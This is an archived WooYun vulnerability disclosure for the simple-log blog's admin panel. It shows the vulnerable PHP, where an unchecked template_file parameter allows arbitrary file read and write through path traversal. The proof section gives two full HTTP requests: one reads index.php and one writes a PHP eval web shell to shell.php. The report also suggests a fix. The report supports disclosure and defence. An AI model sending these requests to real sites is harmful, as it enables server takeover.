@@ -1,0 +1,222 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		simple-log后台任意文件读写漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		simple-log后台任意文件读写漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/风眼哥">风眼哥</a> 
+</li><li>提交时间：		2013-04-04 22:14</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-04：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-07-03：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">simple-log在后台某处没有对参数进行检查导致任意文件读写产生</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">在/admin/includes/set_page.php中：<br />
+<br />
+产生读任意文件的地方：<br />
+<br />
+</p><pre><code>elseif ($action==&#039;get_page_data&#039;)<br />
+{<br />
+	require(PBBLOG_ROOT . &#039;/includes/json.class.php&#039;);<br />
+	$json   = new JSON;<br />
+	$file=$_POST[&#039;template_file&#039;];<br />
+	$res=array(&#039;type&#039;=&gt;&#039;get_page_data&#039;,&#039;content&#039;=&gt;&#039;&#039;,&#039;error&#039;=&gt;&#039;no&#039;);<br />
+<br />
+	$data=file_get_contents(PBBLOG_ROOT.&#039;/themes/&#039;.$config[&#039;template_name&#039;].&#039;/&#039;.$file);<br />
+<br />
+	$res[&#039;content&#039;]=$data;<br />
+	die($json-&gt;encode($res));<br />
+}</code></pre><p class='detail'><br />
+<br />
+$_POST[&#039;template_file&#039;]被传给了$file然后直接字符串拼接进入file_get_contents中导致读任意文件漏洞的产生<br />
+<br />
+<br />
+<br />
+产生写任意文件的地方：<br />
+<br />
+</p><pre><code>elseif ($action==&#039;act_set_page&#039;)<br />
+{<br />
+	$data=htmlspecialchars_decode(stripslashes($_POST[&#039;data&#039;]));<br />
+	$file=$_POST[&#039;template_file&#039;];<br />
+<br />
+	$fp=@fopen(PBBLOG_ROOT.&#039;/themes/&#039;.$config[&#039;template_name&#039;].&#039;/&#039;.$file,&quot;w&quot;) or die(&#039;can not open file&#039;);<br />
+	flock($fp,LOCK_EX);<br />
+	fwrite($fp,$data);<br />
+	fclose($fp);<br />
+	clear_tpl();<br />
+	sys_message(&#039;页面修改成功&#039;,&#039;admin.php?act=set_footer&amp;file=&#039;.$file);<br />
+<br />
+}</code></pre><p class='detail'><br />
+<br />
+同理也是<br />
+<br />
+$_POST[&#039;template_file&#039;]被传给了$file然后直接字符串拼接进入file_get_contents中导致写任意文件漏洞的产生 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">读index.php文件<br />
+<br />
+</p><pre><code>POST /simple-log/admin/admin.php?act=get_page_data HTTP/1.1<br />
+Host: xxx<br />
+User-Agent: xxx<br />
+Accept: application/json, text/javascript, */*<br />
+Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br />
+Accept-Encoding: gzip, deflate<br />
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br />
+X-Requested-With: XMLHttpRequest<br />
+Referer: http://xxx/simple-log/admin/admin.php?act=set_footer&amp;file=blog.html<br />
+Content-Length: 23<br />
+Cookie: xxx<br />
+Connection: keep-alive<br />
+Pragma: no-cache<br />
+Cache-Control: no-cache<br />
+<br />
+template_file=../index.php</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+写一句话到根目录下shell.php<br />
+<br />
+</p><pre><code>POST /simple-log/admin/admin.php?act=act_set_page HTTP/1.1<br />
+Host: target.com<br />
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br />
+Accept-Encoding: gzip, deflate<br />
+Referer: http://target.com/simple-log/admin/admin.php?act=set_footer<br />
+Cookie: CNZZDATA1702264=cnzz_eid%3D1919140847-1364978684-http%253A%252F%252F192.168.189.134%26ntime%3D1364978684%26cnzz_a%3D5%26retime%3D1364978721191%26sin%3Dnone%26ltime%3D1364978721191%26rtime%3D0; PHPSESSID=ic36fuhn6urslbfb8dom2ml936; T3_lang=zh-cn<br />
+Connection: keep-alive<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Content-Length: 155<br />
+<br />
+template_file=../../shell.php&amp;data=%3C%3Fphp%0D%0A%40eval%28%24_POST%5B%27test%27%5D%29%3B%0D%0A%3F%3E&amp;type=set_footer&amp;file=footer.html&amp;button=%E4%BF%AE%E6%94%B9</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对传入的变量进行检查，不允许..存在 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/风眼哥" title="风眼哥">风眼哥</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-021232" title="simple-log后台任意文件读写漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：6 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="21232";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
